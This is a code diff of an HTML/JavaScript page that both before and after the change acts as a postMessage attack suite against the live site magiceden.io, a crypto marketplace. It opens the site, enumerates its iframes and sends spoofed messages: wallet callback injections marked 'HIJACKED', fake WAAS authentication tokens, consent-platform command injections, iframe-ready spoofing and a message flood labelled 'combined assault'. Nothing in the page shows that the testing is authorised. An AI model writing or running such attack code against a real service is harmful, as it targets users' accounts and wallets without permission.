@@ -2,50 +2,38 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>MagicEden Targeted Attack</title>
+    <title>MagicEden Iframe Analysis</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            max-width: 1200px;
+            max-width: 1400px;
             margin: 20px auto;
             padding: 20px;
             background: #f5f5f5;
         }
         
-        h1 {
-            color: #333;
-            border-bottom: 3px solid #dc3545;
-            padding-bottom: 10px;
-        }
+        h1 { color: #333; }
         
-        .warning {
-            background: #fff3cd;
-            border-left: 4px solid #ffc107;
+        .info-box {
+            background: #d1ecf1;
+            border-left: 4px solid #0c5460;
             padding: 15px;
             margin: 20px 0;
         }
         
-        .test-box {
+        .findings {
+            background: #fff3cd;
+            border-left: 4px solid #856404;
+            padding: 15px;
+            margin: 20px 0;
+        }
+        
+        .test-section {
             background: white;
             padding: 20px;
             margin: 15px 0;
             border-radius: 8px;
             box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-        }
-        
-        .test-box h3 {
-            color: #dc3545;
-            margin-top: 0;
-        }
-        
-        .code-box {
-            background: #f8f9fa;
-            padding: 10px;
-            border-radius: 4px;
-            font-family: monospace;
-            font-size: 12px;
-            margin: 10px 0;
-            border-left: 3px solid #667eea;
         }
         
         button {
@@ -64,12 +52,21 @@
             background: #c82333;
         }
         
-        button.safe {
-            background: #28a745;
+        button.info {
+            background: #17a2b8;
         }
         
-        button.safe:hover {
-            background: #218838;
+        button.info:hover {
+            background: #138496;
+        }
+        
+        #iframe-list {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 10px 0;
+            font-family: monospace;
+            font-size: 13px;
         }
         
         #log {
@@ -84,99 +81,57 @@
             margin-top: 20px;
         }
         
-        .received {
-            color: #4ade80;
-            font-weight: bold;
-        }
-        
-        .sent {
-            color: #60a5fa;
-        }
-        
-        .error {
-            color: #f87171;
-            font-weight: bold;
-        }
-        
-        .warning-log {
-            color: #fbbf24;
-            font-weight: bold;
-        }
+        .received { color: #4ade80; font-weight: bold; }
+        .sent { color: #60a5fa; }
+        .error { color: #f87171; font-weight: bold; }
+        .warning { color: #fbbf24; font-weight: bold; }
     </style>
 </head>
 <body>
-    <h1>🎯 MagicEden Code-Based Attack Vectors</h1>
+    <h1>🔍 MagicEden Iframe & Window Analysis</h1>
     
-    <div class="warning">
-        <strong>⚠️ Based on the actual MagicEden code listeners:</strong><br>
-        Testing exact patterns from listeners #1-9 in the provided code
+    <div class="info-box">
+        <strong>Strategy:</strong> The vulnerable listeners might be in iframes, not the main window.<br>
+        Let's enumerate all frames and try to message them directly.
     </div>
     
-    <div class="test-box">
-        <h3>Attack 1: Listener Pattern Matching (listeners #1, #2, #3)</h3>
-        <div class="code-box">
-            Pattern: ({source:e,data:t})=>{e===K&&t===r&&i.length&&i.shift()()}<br>
-            Target: Checks if source matches specific value and data matches 'r'
-        </div>
-        <p>Tries to trigger callbacks by matching source/data patterns</p>
-        <button onclick="attack1()">🔥 ATTACK 1</button>
+    <div class="findings">
+        <strong>Known Vulnerable Frames:</strong><br>
+        • auth.magiceden.io (has WAAS listeners)<br>
+        • Wallet connect iframes<br>
+        • Other embedded contexts
     </div>
     
-    <div class="test-box">
-        <h3>Attack 2: Wallet Origin Bypass (listener #4)</h3>
-        <div class="code-box">
-            Pattern: if(e.origin!==this.walletOrigin)return;<br>
-            Target: Wallet callback handler - tries to spoof walletOrigin
-        </div>
-        <p>Attempts to bypass wallet origin check and trigger callbacks</p>
-        <button onclick="attack2()">🔥 ATTACK 2</button>
+    <div class="test-section">
+        <h3>Step 1: Open MagicEden & Wait</h3>
+        <button onclick="openTarget()" class="info">Open MagicEden</button>
+        <p id="open-status">Not opened yet</p>
     </div>
     
-    <div class="test-box">
-        <h3>Attack 3: Tcf/Osano Command Injection (listener #5)</h3>
-        <div class="code-box">
-            Pattern: {command:n,parameter:r,version:s,callId:a}<br>
-            Target: __tcfapiCall / __cmpCall handlers
-        </div>
-        <p>Injects commands into consent management platform handlers</p>
-        <button onclick="attack3()">🔥 ATTACK 3</button>
+    <div class="test-section">
+        <h3>Step 2: Enumerate All Frames</h3>
+        <button onclick="enumerateFrames()" class="info">List All Iframes</button>
+        <div id="iframe-list">No frames enumerated yet</div>
     </div>
     
-    <div class="test-box">
-        <h3>Attack 4: Iframe Instance Hijacking (listener #6)</h3>
-        <div class="code-box">
-            Pattern: a.data==`iframe-ready-${this.instanceId}`<br>
-            Target: Iframe initialization - tries to spoof ready message
-        </div>
-        <p>Attempts to hijack iframe with predictable instance IDs</p>
-        <button onclick="attack4()">🔥 ATTACK 4</button>
+    <div class="test-section">
+        <h3>Step 3: Message All Frames</h3>
+        <button onclick="messageAllFrames()">💣 Message Every Frame</button>
+        <p>Sends test messages to main window + all iframes</p>
     </div>
     
-    <div class="test-box">
-        <h3>Attack 5: Auth Frame Bridge (listener #7, #8, #9)</h3>
-        <div class="code-box">
-            Pattern: auth.magiceden.io frames checking origin === "host"<br>
-            Target: WAAS authentication flow
-        </div>
-        <p>Tests auth frame message handling</p>
-        <button onclick="attack5()">🔥 ATTACK 5</button>
-    </div>
-    
-    <div class="test-box">
-        <h3>🔴 COMBINED ASSAULT</h3>
-        <p>Runs ALL attacks simultaneously with message flooding</p>
-        <button onclick="attackAll()" style="font-size: 18px; padding: 15px 30px;">💣 RUN ALL ATTACKS</button>
+    <div class="test-section">
+        <h3>Step 4: Targeted Attacks on Specific Frames</h3>
+        <button onclick="attackAuthFrames()">🎯 Attack Auth Frames</button>
+        <button onclick="attackWalletFrames()">💰 Attack Wallet Frames</button>
     </div>
     
     <div id="log"></div>
-    <button onclick="clearLog()" class="safe">Clear Log</button>
-    <button onclick="location.reload()" class="safe">Reset Page</button>
+    <button onclick="clearLog()" style="background: #28a745;">Clear Log</button>
     
     <script>
-        const TARGET = 'https://magiceden.io';
-        const AUTH_TARGET = 'https://auth.magiceden.io';
-        const WAIT = 15000;
-        let win = null;
+        let targetWindow = null;
+        let frameList = [];
         let msgCount = 0;
         
         function log(msg, type = 'sent') {
@@ -192,237 +147,195 @@
             msgCount = 0;
         }
         
-        // Global listener
+        // Global message listener
         window.addEventListener('message', function(e) {
             msgCount++;
-            log('📨 MSG #' + msgCount + ' FROM: ' + e.origin, 'received');
-            log('   DATA: ' + JSON.stringify(e.data).substring(0, 200), 'received');
+            log('📨 #' + msgCount + ' FROM: ' + e.origin, 'received');
+            log('   ' + JSON.stringify(e.data).substring(0, 150), 'received');
             
             const str = JSON.stringify(e.data);
-            if (str.includes('error') || str.includes('Error')) {
-                log('   🚨 ERROR IN RESPONSE!', 'error');
-            }
-            if (str.includes('success') || str.includes('returnValue')) {
-                log('   ⚡ CALLBACK EXECUTED!', 'error');
-            }
-            if (str.includes('wallet') || str.includes('waas') || str.includes('auth')) {
-                log('   💰 WALLET/AUTH RELATED!', 'warning-log');
-            }
+            if (str.includes('error')) log('   🚨 ERROR!', 'error');
+            if (str.includes('success') || str.includes('returnValue')) log('   ⚡ CALLBACK!', 'error');
+            if (str.includes('wallet') || str.includes('waas')) log('   💰 WALLET!', 'warning');
         });
         
-        // Attack 1: Source/Data pattern matching
-        function attack1() {
-            log('=== ATTACK 1: SOURCE/DATA PATTERN ===', 'error');
-            win = window.open(TARGET, 'attack1');
+        // Step 1: Open target
+        function openTarget() {
+            log('Opening MagicEden...', 'warning');
+            targetWindow = window.open('https://magiceden.io', 'magiceden');
+            document.getElementById('open-status').textContent = 'Opened! Wait 15 seconds then enumerate frames...';
+            document.getElementById('open-status').style.color = 'green';
             
             setTimeout(function() {
-                log('Trying source/data combinations...');
-                
-                // Try different source values (K, W, eV from code)
-                const sources = ['K', 'W', 'eV', 'r', 'source'];
-                const dataValues = ['r', 'data', true, 1];
-                
-                sources.forEach(function(src) {
-                    dataValues.forEach(function(dat) {
-                        win.postMessage({source: src, data: dat}, '*');
-                    });
-                });
-                
-                log('Sent ' + (sources.length * dataValues.length) + ' pattern attempts');
-            }, WAIT);
+                log('✅ Page should be loaded now', 'received');
+                document.getElementById('open-status').textContent = 'Ready! Click "List All Iframes"';
+            }, 15000);
         }
         
-        // Attack 2: Wallet callback bypass
-        function attack2() {
-            log('=== ATTACK 2: WALLET CALLBACK BYPASS ===', 'error');
-            win = window.open(TARGET, 'attack2');
+        // Step 2: Enumerate frames
+        function enumerateFrames() {
+            if (!targetWindow) {
+                alert('Open MagicEden first!');
+                return;
+            }
             
-            setTimeout(function() {
-                log('Attempting wallet callback injection...');
+            log('=== ENUMERATING FRAMES ===', 'warning');
+            frameList = [];
+            
+            try {
+                // Try to access frames
+                log('Main window: ' + targetWindow.location.href, 'received');
+                frameList.push({type: 'main', ref: targetWindow, url: targetWindow.location.href});
+            } catch(e) {
+                log('Main window (cross-origin, cannot access URL)', 'received');
+                frameList.push({type: 'main', ref: targetWindow, url: 'cross-origin'});
+            }
+            
+            // Try to enumerate iframes
+            try {
+                const frames = targetWindow.frames;
+                log('Found ' + frames.length + ' frames', 'received');
                 
-                // Try to trigger callbacks with IDs
-                for (let i = 0; i < 100; i++) {
-                    win.postMessage({
+                for (let i = 0; i < frames.length; i++) {
+                    try {
+                        const url = frames[i].location.href;
+                        log('  Frame ' + i + ': ' + url, 'received');
+                        frameList.push({type: 'iframe', index: i, ref: frames[i], url: url});
+                    } catch(e) {
+                        log('  Frame ' + i + ': (cross-origin)', 'received');
+                        frameList.push({type: 'iframe', index: i, ref: frames[i], url: 'cross-origin'});
+                    }
+                }
+            } catch(e) {
+                log('Cannot enumerate frames: ' + e.message, 'error');
+            }
+            
+            // Update display
+            let html = 'Found ' + frameList.length + ' targets:<br>';
+            frameList.forEach(function(f, i) {
+                html += (i + 1) + '. ' + f.type + ' - ' + f.url + '<br>';
+            });
+            document.getElementById('iframe-list').innerHTML = html;
+            
+            log('✅ Enumeration complete: ' + frameList.length + ' targets', 'received');
+        }
+        
+        // Step 3: Message all frames
+        function messageAllFrames() {
+            if (frameList.length === 0) {
+                alert('Enumerate frames first!');
+                return;
+            }
+            
+            log('=== MESSAGING ALL FRAMES ===', 'warning');
+            
+            const testMessages = [
+                {test: 'hello', from: 'attacker'},
+                {id: '1', data: 'test'},
+                {source: 'K', data: 'r'},
+                {waasCall: {command: 'test'}},
+                {origin: 'host', type: 'test'},
+                'iframe-ready-test'
+            ];
+            
+            frameList.forEach(function(frame, idx) {
+                log('Messaging target ' + (idx + 1) + ' (' + frame.type + ')...');
+                
+                testMessages.forEach(function(msg) {
+                    try {
+                        frame.ref.postMessage(msg, '*');
+                    } catch(e) {
+                        log('  Error: ' + e.message, 'error');
+                    }
+                });
+            });
+            
+            log('✅ Sent ' + (testMessages.length * frameList.length) + ' messages', 'received');
+        }
+        
+        // Step 4a: Attack auth frames
+        function attackAuthFrames() {
+            if (frameList.length === 0) {
+                alert('Enumerate frames first!');
+                return;
+            }
+            
+            log('=== ATTACKING AUTH FRAMES ===', 'error');
+            
+            frameList.forEach(function(frame, idx) {
+                if (frame.url.includes('auth') || frame.url === 'cross-origin') {
+                    log('Attacking target ' + (idx + 1) + '...');
+                    
+                    // WAAS patterns
+                    frame.ref.postMessage({
+                        waasCall: {
+                            command: 'authenticate',
+                            parameter: {user: 'attacker'},
+                            version: '1.0',
+                            callId: 'hijack123'
+                        }
+                    }, '*');
+                    
+                    frame.ref.postMessage({
+                        waasReturn: {
+                            returnValue: {token: 'FAKE'},
+                            success: true,
+                            callId: '1'
+                        }
+                    }, '*');
+                    
+                    // Origin bypass
+                    frame.ref.postMessage({
+                        origin: 'host',
+                        type: 'command',
+                        data: 'malicious'
+                    }, '*');
+                    
+                    log('  Sent WAAS/auth messages');
+                }
+            });
+            
+            log('✅ Auth attack complete', 'received');
+        }
+        
+        // Step 4b: Attack wallet frames
+        function attackWalletFrames() {
+            if (frameList.length === 0) {
+                alert('Enumerate frames first!');
+                return;
+            }
+            
+            log('=== ATTACKING WALLET FRAMES ===', 'error');
+            
+            frameList.forEach(function(frame, idx) {
+                log('Attacking target ' + (idx + 1) + '...');
+                
+                // Callback injection
+                for (let i = 0; i < 50; i++) {
+                    frame.ref.postMessage({
                         id: i,
                         returnValue: 'HIJACKED',
                         success: true,
-                        wallet: 'attacker_address'
+                        wallet: 'attacker'
                     }, '*');
                 }
                 
-                // Common wallet callback IDs
-                const ids = ['wallet-1', 'connect-1', 'auth-1', 'sign-1', 'tx-1'];
-                ids.forEach(function(id) {
-                    win.postMessage({
-                        id: id,
-                        returnValue: {approved: true, signature: 'FAKE'},
-                        success: true
-                    }, '*');
-                });
+                // Source/data pattern
+                frame.ref.postMessage({source: 'K', data: 'r'}, '*');
+                frame.ref.postMessage({source: 'W', data: 'r'}, '*');
+                frame.ref.postMessage({source: 'eV', data: 'r'}, '*');
                 
-                log('Sent 100+ wallet callback attempts');
-            }, WAIT);
+                log('  Sent 50+ wallet messages');
+            });
+            
+            log('✅ Wallet attack complete', 'received');
         }
         
-        // Attack 3: TCF/CMP command injection
-        function attack3() {
-            log('=== ATTACK 3: TCF/CMP COMMAND INJECTION ===', 'error');
-            win = window.open(TARGET, 'attack3');
-            
-            setTimeout(function() {
-                log('Injecting consent management commands...');
-                
-                // __tcfapiCall pattern
-                win.postMessage({
-                    __tcfapiCall: {
-                        command: 'getVendorConsents',
-                        parameter: null,
-                        version: 2,
-                        callId: 1
-                    }
-                }, '*');
-                
-                // __cmpCall pattern
-                win.postMessage({
-                    __cmpCall: {
-                        command: 'getConsentData',
-                        parameter: null,
-                        callId: 1
-                    }
-                }, '*');
-                
-                // Try to get return messages
-                win.postMessage({
-                    __tcfapiReturn: {
-                        returnValue: {consent: true},
-                        success: true,
-                        callId: 1
-                    }
-                }, '*');
-                
-                log('Sent CMP command injections');
-            }, WAIT);
-        }
-        
-        // Attack 4: Iframe instance hijacking
-        function attack4() {
-            log('=== ATTACK 4: IFRAME INSTANCE HIJACK ===', 'error');
-            win = window.open(TARGET, 'attack4');
-            
-            setTimeout(function() {
-                log('Trying iframe-ready patterns...');
-                
-                // Common instance IDs
-                const patterns = [
-                    'iframe-ready-1',
-                    'iframe-ready-default',
-                    'iframe-ready-main',
-                    'iframe-ready-0',
-                    'iframe-ready-wallet',
-                    'iframe-ready-auth'
-                ];
-                
-                // Also try timestamp-based
-                for (let i = 0; i < 20; i++) {
-                    patterns.push('iframe-ready-' + (Date.now() - i * 1000));
-                }
-                
-                patterns.forEach(function(p) {
-                    win.postMessage(p, '*');
-                });
-                
-                log('Sent ' + patterns.length + ' iframe-ready attempts');
-            }, WAIT);
-        }
-        
-        // Attack 5: Auth frame bridge
-        function attack5() {
-            log('=== ATTACK 5: AUTH FRAME BRIDGE ===', 'error');
-            win = window.open(TARGET, 'attack5');
-            
-            setTimeout(function() {
-                log('Testing auth frame messages...');
-                
-                // Pattern from listener #9: origin === "host"
-                win.postMessage({
-                    origin: 'host',
-                    type: 'text',
-                    text: 'malicious'
-                }, '*');
-                
-                // WAAS patterns from auth.magiceden.io
-                win.postMessage({
-                    waasCall: {
-                        command: 'authenticate',
-                        parameter: {user: 'attacker'},
-                        version: '1.0',
-                        callId: '123'
-                    }
-                }, '*');
-                
-                win.postMessage({
-                    waasReturn: {
-                        returnValue: {token: 'FAKE_TOKEN'},
-                        success: true,
-                        callId: '1'
-                    }
-                }, '*');
-                
-                log('Sent auth frame messages');
-            }, WAIT);
-        }
-        
-        // Combined attack
-        function attackAll() {
-            log('=== 💣 COMBINED ASSAULT INITIATED ===', 'error');
-            log('Opening target...', 'error');
-            
-            win = window.open(TARGET, 'combined');
-            
-            setTimeout(function() {
-                log('LAUNCHING ALL ATTACKS...', 'error');
-                
-                // Rapid-fire all patterns
-                let totalSent = 0;
-                
-                // Attack 1 patterns
-                ['K', 'W', 'eV'].forEach(function(s) {
-                    ['r', true].forEach(function(d) {
-                        win.postMessage({source: s, data: d}, '*');
-                        totalSent++;
-                    });
-                });
-                
-                // Attack 2 - callbacks
-                for (let i = 0; i < 50; i++) {
-                    win.postMessage({id: i, returnValue: 'HIJACK', success: true}, '*');
-                    totalSent++;
-                }
-                
-                // Attack 3 - CMP
-                win.postMessage({__tcfapiCall: {command: 'test', callId: 1}}, '*');
-                win.postMessage({__cmpCall: {command: 'test', callId: 1}}, '*');
-                totalSent += 2;
-                
-                // Attack 4 - iframe ready
-                for (let i = 0; i < 10; i++) {
-                    win.postMessage('iframe-ready-' + i, '*');
-                    totalSent++;
-                }
-                
-                // Attack 5 - auth
-                win.postMessage({origin: 'host', type: 'command'}, '*');
-                win.postMessage({waasCall: {command: 'test'}}, '*');
-                totalSent += 2;
-                
-                log('🔥 SENT ' + totalSent + ' MALICIOUS MESSAGES', 'error');
-                log('Watch for responses...', 'warning-log');
-            }, WAIT);
-        }
-        
-        log('💀 ATTACK SUITE READY');
-        log('⚠️ Testing actual code patterns from MagicEden');
-        log('Click an attack button to begin');
+        log('🎯 Iframe Analysis Suite Ready');
+        log('STEP 1: Click "Open MagicEden"');
+        log('STEP 2: Wait 15 seconds');
+        log('STEP 3: Click "List All Iframes"');
+        log('STEP 4: Click attack buttons');
     </script>
 </body>
 </html>
